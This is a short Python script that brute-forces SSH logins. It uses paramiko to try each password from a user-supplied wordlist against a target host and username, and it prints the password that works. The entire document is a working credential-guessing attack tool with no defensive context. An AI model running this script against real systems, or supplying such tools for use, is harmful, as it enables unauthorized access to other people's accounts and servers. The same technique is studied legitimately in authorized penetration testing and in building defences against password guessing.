import paramiko, sys, os, socket, termcolor


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code


host = input(termcolor.colored('[+] Target Address: ', 'blue'))
username = input(termcolor.colored('[+] SSH Username: ', 'blue'))
pass_file = input(termcolor.colored('[+] Password File/Path: ', 'blue'))

if os.path.exists(pass_file) == False:
    print(termcolor.colored('[!!] File/Path Does Not Exist.', 'yellow'))
    sys.exit(1)

with open(pass_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            
            if response == 0:
                print(termcolor.colored('[+] Found Password: ', 'green') + password + termcolor.colored(' , For Account ', 'green') + username)
                break
            elif response == 1:
                print(termcolor.colored('[-] Incorrect Login: ', 'red') + password)
            else:
                print(termcolor.colored(("[!!] Can't Connect"), 'orange'))
                sys.exit(1)

        except Exception as e:
            print(e)
            pass

